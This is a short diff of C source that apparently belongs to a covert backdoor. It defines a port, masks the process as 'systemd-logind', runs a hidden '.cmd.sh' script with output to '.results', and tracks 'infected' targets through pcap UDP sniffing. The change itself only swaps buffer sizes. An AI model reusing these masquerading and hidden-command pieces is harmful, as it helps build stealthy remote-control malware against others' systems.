@@ -28,7 +28,6 @@
 
 #define PORT "8505"
 #define UPORT 8505
-#define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
 #define CHMOD "chmod 755 .cmd.sh"
@@ -100,16 +99,14 @@ struct filter{
     const char *port[FILTERAMOUNT];
     unsigned short port_short[FILTERAMOUNT];
     unsigned short port_ushort[FILTERAMOUNT];
-    char targetip[BUFFERSIZE];
-    char localip[BUFFERSIZE];
+    char targetip[BUFSIZ];
+    char localip[BUFSIZ];
     int pattern[FILTERAMOUNT];
     bool infected;
     //add the filter
     //add interface
     //add tcp and udp flag
 };
-
-char *pcapfilter;
 
 //void ParseUDP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
